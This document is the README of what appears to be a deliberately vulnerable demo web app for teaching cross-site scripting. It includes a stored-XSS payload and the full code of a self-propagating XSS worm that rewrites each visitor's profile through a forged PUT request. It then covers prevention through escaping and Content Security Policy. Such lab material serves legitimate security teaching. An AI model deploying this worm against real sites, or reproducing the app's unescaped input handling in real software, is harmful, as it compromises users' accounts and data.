# Cross-site scripting demonstration

This web application is only used for XSS demonstration, hence its modest appearance

## Usage

Clone this project to your device and run these command in its root directory:

```npm
npm install
npm run dev
```

Open a browser, access localhost:8080, you can log in from there. There are 5 available accounts: hao, thoi, dinh, john, bucky. All of them have the same password which is 123. You can edit or add account in [database/usersData.json](database/usersData.json), this project doesn't have a register account or change password feature simply because it isn't needed for its purpose (demonstrate XSS).

After logged in, you can add new messages, edit your profile, or view other user's profile by clicking their name (where we will put the XSS stuff).

## XSS in action

Login -> Edit user -> Put the code below in the "Introduction" textarea and press "Done". This will cause an alert to show up every time a user visits your profile. Of course, you can do more than just show a harmless alert, but it's what attackers do when they examine if a website is vulnerable to XSS.\
You can also send this as a message to show the same alert everytime a user open the message page.

```html
</textarea> <script>alert("hehe");</script>
<!-- Put the </textarea> right before the malicious javascript to end the previous textarea tag. You can see it using the developer tool. -->
```

This code below will cause an alert to show up every time a user visits your profile, but also copy its entire code to that user's "Introduction", making it a self-propagating worm.\
I haven't figure out how to make this worm work with messages, you can try it out.

```html
</textarea> 
<script id="worm">
    alert("hehe");  // the main attacking code

    // ----- the self-propagating code -----
    var headerTag = '<script id="worm">';
    var ownCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>"; // splitting up the tag to prevent the worm code from ending here
    var wormCode = "</textarea>" + headerTag + ownCode + tailTag;
    window.onload = function () {
        var updatedUser = {
            introduction: wormCode
        };

        var xhr = new XMLHttpRequest();
        xhr.open("PUT", "/editUser", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify(updatedUser));
    };
    // ----- the self-propagating code -----
</script>
```

***Where the XHR come from***: Use the developer tool (turn on Preserve log) to see the request sent when pressing the "Done" button in the editUser page (the button that can change a user's profile). You can see that a request called "editUser" is sent, if it's cancelled, you can right click it and choose Copy -> Copy as fetch and paste it somewhere to examine. It's method is PUT and body is {"introduction":"..."}, so we construct a similar XHR to send to the server. Obviously we can see it in the server's source code but I'm talking in the attacker's perspective, who doesn't have the source code (maybe).

## Prevention

### **Escape dynamic content**

Go to [controllers/userController.js line 40](controllers/userController.js#L40)  (the editUser PUT request):

```javascript
var newIntroduction = req.body.introduction;
// newIntroduction = newIntroduction.replace(/&/g, "&amp;");
// newIntroduction = newIntroduction.replace(/</g, "&lt;");
// newIntroduction = newIntroduction.replace(/>/g, "&gt;");
// newIntroduction = newIntroduction.replace(/"/g, "&quot;");
// newIntroduction = newIntroduction.replace(/'/g, "&#039;");
```

Uncomment those 5 comments, this will escape every {&, <, >, ", '} to its entity encoding {&amp, &lt, &gt, &quot, &#039} in the received content. This way, every javascript in the received content become useless.

### **Content Security Policy**

[Content Securiy Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) is the standard solution to many web security problem. It restrict what can be executed, performed in a web page so malicious codes have a harder time doing anything.

Go to [controllers/userController.js line 17](controllers/userController.js#L17) and [line 68](controllers/userController.js#L68):

```javascript
res.writeHead(200, {
    "Content-Type": "text/html",
    //"Content-security-policy": "default-src 'self'",
});
```

Uncomment that Content-securiy-policy line, to set Content Securiy Policy to the response's header before sending it away.

Or you can go to [resources/editUser.html line 9](resources/editUser.html#L9) and [resources/viewUser.html line 9](resources/viewUser.html#L9):

```html
<!-- <meta http-equiv="Content-Security-Policy" content="default-src 'self'"> -->
```

Uncomment the meta tag and it will have the same effect as above.

The CSP option that we saw is:

```CSP
Content-security-policy: default-src 'self'
```

[`default-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) means for every `src` directives that are absent, it will use this one's value instead (the one that we need are [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)).\
[`self`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources#sources) means that the web pages can only use resources which come from its own server.

## Reference

Web Security for Developers: Real Threats, Practical Defense\
<https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/>
